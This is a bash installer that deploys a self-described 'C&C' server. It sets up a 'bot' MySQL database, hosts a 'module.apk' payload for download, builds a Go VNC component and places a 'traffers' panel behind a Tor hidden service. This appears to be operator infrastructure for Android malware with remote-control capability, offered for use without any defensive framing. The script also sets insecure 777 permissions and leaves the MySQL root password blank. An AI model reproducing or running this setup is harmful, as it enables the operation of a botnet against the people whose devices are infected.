#!/bin/bash


echo "IP Server:"
read ipserver

apicrypt=$(openssl rand -hex 6)
loginpanelpassword=$(openssl rand -hex 6)
sqlpassword=$(openssl rand -hex 6)
#Install-Settings
apt update
add-apt-repository ppa:ondrej/php
apt install unzip -y
apt install sudo -y
apt install systemd tor curl nginx npm vim -y
apt install mysql-server -y
apt install p7zip-full screen ufw -y
apt install unzip zip -y
apt install php8.1-fpm php8.1 php8.1-cli php8.1-xml php8.1-mysql php8.1-curl php8.1-mbstring php8.1-zip -y
systemctl restart mysql
chmod 777 /var/run/mysqld 


rm /etc/mysql/mysql.cnf
mv mysql/mysql.cnf /etc/mysql/mysql.cnf
systemctl restart mysql
chmod 777 /var/run/mysqld

#FireWall
sudo ufw allow 22
sudo ufw allow 8000
sudo ufw allow 5000
sudo ufw allow 2000
sudo ufw allow 4000
sudo ufw block 3306
sudo ufw enable

#NodeInstall
dos2unix node.sh
chmod 777 node.sh

sleep 5

#C&C
sed -i "s/\.\.deadcode\.\./$sqlpassword/g" addadmin.sh
dos2unix addadmin.sh
chmod 777 addadmin.sh
rm -rf /var/www/html
mv backend/files/* /var/www/
rm -rf backend 
mv module/module.apk /var/www/html/ 
chmod 777 /var/www/html/module.apk

sed -i "s/\.\.keyenc\.\./$apicrypt/g" /var/www/html/conf.php
sed -i "s/\.\.confgatepassword\.\./$sqlpassword/g" /var/www/html/conf.php
sed -i "s/\.\.restapipassword\.\./$sqlpassword/g" /var/www/tor/db.php
sed -i "s/\.\.keyenc\.\./$apicrypt/g" /var/www/tor/db.php
sed -i "s/\.\.restapipassword\.\./$sqlpassword/g" /var/www/tor/restapi.php



#mysql
mysql -uroot --password="" -e 'CREATE DATABASE bot /*\!40100 DEFAULT CHARACTER SET utf8 */;'
mysql -uroot --password="" -e "CREATE USER 'phoniex'@'localhost' IDENTIFIED BY '$sqlpassword';"
mysql -uroot --password="" -e "GRANT ALL PRIVILEGES ON *.* TO 'phoniex'@'localhost';"
mysql -uroot --password="" -e "FLUSH PRIVILEGES;"


mysql -u root -p bot < database/bot.sql

sleep 5

mysql -u root -p bot < database/dataInjections.sql

sleep 5
rm -rf database
#SETTINGSPANEL


mv nginx.conf /etc/nginx/nginx.conf


systemctl restart nginx
systemctl restart tor

#VNC Build
apt purge golang -y
apt autoremove -y
tar -C /opt -xzf go1.21.7.linux-amd64.tar.gz
export PATH=$PATH:/opt/go/bin
rm go1.21.7.linux-amd64.tar.gz
go env -w GO111MODULE=off && go get github.com/go-sql-driver/mysql && go get github.com/gorilla/mux && go get github.com/gorilla/websocket
sed -i "s/\.\.sqlvnc\.\./$sqlpassword/g" vnc.go
go build -ldflags="-s -w" vnc.go
chmod 777 vnc
rm vnc.go
mv vnc /root/

mkdir /var/data/
mv www /var/data/www


read -r -d '' frontend << EOM
DATABASE_URL="mysql://phoniex:$sqlpassword@localhost:3306/bot"
NEXTAUTH_URL="http://$ipserver:5000"
SECRET="$apicrypt"
LOGIN_SECRET="$loginpanelpassword"
RESTAPI="http://$ipserver:2000/restapi.php"
WS_URL="http://$ipserver:8000"
EOM

echo "$frontend" > /var/data/www/.env


#TrafficTOr
mkdir /var/www/traffers/
mkdir /var/www/traffers/1/
mv traffer/index.php /var/www/traffers/1/

sed -i "s/\.\.sqlpasswordtraffic\.\./$sqlpassword/g" /var/www/traffers/1/index.php


rm /etc/tor/torrc
read -r -d '' torcfg << EOM
HiddenServiceDir /var/lib/tor/traffer1/
HiddenServicePort 80 127.0.0.1:6001
EOM

echo "$torcfg" > /etc/tor/torrc

systemctl restart tor
service tor restart 

sleep 5

phgs=$(cat /var/lib/tor/traffer1/hostname)

sed -i "s/\.\.toronion\.\./$phgs/g" traffer/traffer.conf

mv traffer/traffer.conf /etc/nginx/conf.d/traffer1.conf

sed -i "s/\.\.passsql\.\./$sqlpassword/g" manual.txt

systemctl restart nginx 

sed -i "s/\.\.trafficpanel\.\./$phgs/g" manual.txt
sed -i "s/\.\.urlpanel\.\./$ipserver/g" manual.txt
sed -i "s/\.\.apicryptkey\.\./$apicrypt/g" manual.txt
sed -i "s/\.\.loginds\.\./$loginpanelpassword/g" manual.txt

dos2unix uninstaller.sh
chmod 777 uninstaller.sh

echo ""
echo "-------------------------------"
echo "Installation complete C&C"
echo "Security DB #Add root pass Mysql; SET PASSWORD FOR 'root'@'localhost' = PASSWORD('newpass');"
echo "go to manual.txt, and execute the commands in paragraph 2"
